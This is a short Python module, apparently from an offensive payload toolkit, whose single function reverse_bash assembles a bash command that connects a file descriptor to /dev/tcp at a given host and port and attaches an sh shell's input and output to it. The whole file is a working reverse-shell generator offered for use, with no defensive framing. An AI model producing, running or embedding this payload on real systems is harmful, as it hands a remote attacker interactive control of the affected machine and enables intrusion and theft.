__all__ = ['reverse_bash']

import random
from shlex import quote


def reverse_bash(lhost: str, lport: int, *, bash_path="bash", shell_path="sh") -> str:
    """Creates an interactive shell via bash's builtin /dev/tcp"""
    bash_path = bash_path or '/bin/bash'
    shell_path = shell_path or '/bin/sh'
    fd = random.choice(range(20, 220))
    return "{0} -c {cmd}".format(
        bash_path,
        cmd=quote(
            ";".join(
                [
                    f"0<&{fd}-",
                    f"exec {fd}<>/dev/tcp/{lhost}/{lport}",
                    f"{shell_path} <&{fd} >&{fd} 2>&{fd}",
                ]
            )
        ),
    )
